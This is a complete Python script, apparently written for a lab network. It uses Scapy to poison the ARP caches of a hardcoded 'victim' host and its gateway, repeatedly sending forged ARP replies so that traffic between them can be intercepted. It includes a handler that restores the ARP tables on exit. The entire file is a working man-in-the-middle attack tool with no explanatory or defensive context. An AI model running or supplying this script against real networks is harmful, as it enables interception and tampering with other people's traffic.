from scapy.all import ARP, Ether, send, srp
import time
import signal
import sys

# Set target and gateway IPs
target_ip = "192.168.114.129"     # Victim
gateway_ip = "192.168.114.2"      # Router/Gateway

def get_mac(ip):
    # Send ARP request to get MAC address
    arp_req = ARP(pdst=ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp_req
    result = srp(packet, timeout=2, verbose=0)[0]

    if result:
        return result[0][1].hwsrc
    else:
        return None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"[!] Failed to get MAC for {target_ip}")
        sys.exit(1)

    # Construct spoofed ARP packet
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac,
                 psrc=spoof_ip)
    send(packet, verbose=0)
    print(f"[+] Sent spoofed ARP to {target_ip} claiming to be {spoof_ip}")

def restore(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)

    if not dest_mac or not source_mac:
        print("[!] Could not get MACs for restoration")
        return

    packet = ARP(op=2, pdst=dest_ip, hwdst=dest_mac,
                 psrc=source_ip, hwsrc=source_mac)
    send(packet, count=5, verbose=0)
    print(f"[!] Restored ARP table for {dest_ip}")

def stop(signum, frame):
    print("\n[!] Detected CTRL+C. Restoring ARP tables...")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    sys.exit(0)

signal.signal(signal.SIGINT, stop)

print(f"[+] Starting ARP spoofing: pretending {gateway_ip} to {target_ip}...")
while True:
    spoof(target_ip, gateway_ip)   # Victim: "I'm the gateway"
    spoof(gateway_ip, target_ip)   # Gateway: "I'm the victim"
    time.sleep(2)
